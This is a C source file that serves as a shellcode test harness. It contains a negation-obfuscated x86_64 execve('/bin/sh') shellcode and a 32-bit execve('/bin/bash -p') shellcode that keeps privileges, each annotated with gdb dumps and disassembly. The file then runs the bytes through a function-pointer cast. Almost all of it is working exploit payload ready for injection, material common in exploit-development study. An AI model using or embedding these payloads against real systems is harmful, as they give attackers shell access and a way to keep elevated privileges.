#include <stdio.h>
#include <string.h>

int main(void)
{
#if __x86_64__
  puts("x86_64");
  /*
   * ;rdi            0x4005c4 0x4005c4
   * ;rsi            0x7fffffffdf40   0x7fffffffdf40
   * ;rdx            0x0      0x0
   * ;gdb$ x/s $rdi
   * ;0x4005c4:        "/bin/sh"
   * ;gdb$ x/s $rsi
   * ;0x7fffffffdf40:  "\304\005@"
   * ;gdb$ x/32xb $rsi
   * ;0x7fffffffdf40: 0xc4    0x05    0x40    0x00    0x00    0x00    0x00    0x00
   * ;0x7fffffffdf48: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
   * ;0x7fffffffdf50: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
   * ;0x7fffffffdf58: 0x55    0xb4    0xa5    0xf7    0xff    0x7f    0x00    0x00
   * ;
   * ;=> 0x7ffff7aeff20 <execve>:     mov    eax,0x3b
   * ;   0x7ffff7aeff25 <execve+5>:   syscall
   * ;
   *
   * main:
   *     ;mov rbx, 0x68732f6e69622f2f
   *     ;mov rbx, 0x68732f6e69622fff
   *     ;shr rbx, 0x8
   *     ;mov rax, 0xdeadbeefcafe1dea
   *     ;mov rbx, 0xdeadbeefcafe1dea
   *     ;mov rcx, 0xdeadbeefcafe1dea
   *     ;mov rdx, 0xdeadbeefcafe1dea
   *     xor eax, eax
   *     mov rbx, 0xFF978CD091969DD1
   *     neg rbx
   *     push rbx
   *     ;mov rdi, rsp
   *     push rsp
   *     pop rdi
   *     cdq
   *     push rdx
   *     push rdi
   *     ;mov rsi, rsp
   *     push rsp
   *     pop rsi
   *     mov al, 0x3b
   *     syscall
   */

  char *code = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c"
    "\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52"
    "\x57\x54\x5e\xb0\x3b\x0f\x05";
#else
  puts("not x86_64");

  /*
     Disassembly of section .text:

     08048054 <.text>:
8048054:  6a 0b                  push   $0xb
8048056:  58                     pop    %eax
8048057:  99                     cltd
8048058:  52                     push   %edx
8048059:  66 68 2d 70            pushw  $0x702d
804805d:  89 e1                  mov    %esp,%ecx
804805f:  52                     push   %edx
8048060:  6a 68                  push   $0x68
8048062:  68 2f 62 61 73         push   $0x7361622f
8048067:  68 2f 62 69 6e         push   $0x6e69622f
804806c:  89 e3                  mov    %esp,%ebx
804806e:  52                     push   %edx
804806f:  51                     push   %ecx
8048070:  53                     push   %ebx
8048071:  89 e1                  mov    %esp,%ecx
8048073:  cd 80                  int    $0x80
*/

  char *code = "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70"
    "\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61"
    "\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52"
    "\x51\x53\x89\xe1\xcd\x80";

#endif

  printf("Length : %lu\n", strlen(code));
  (*(void(*)()) code)();
}
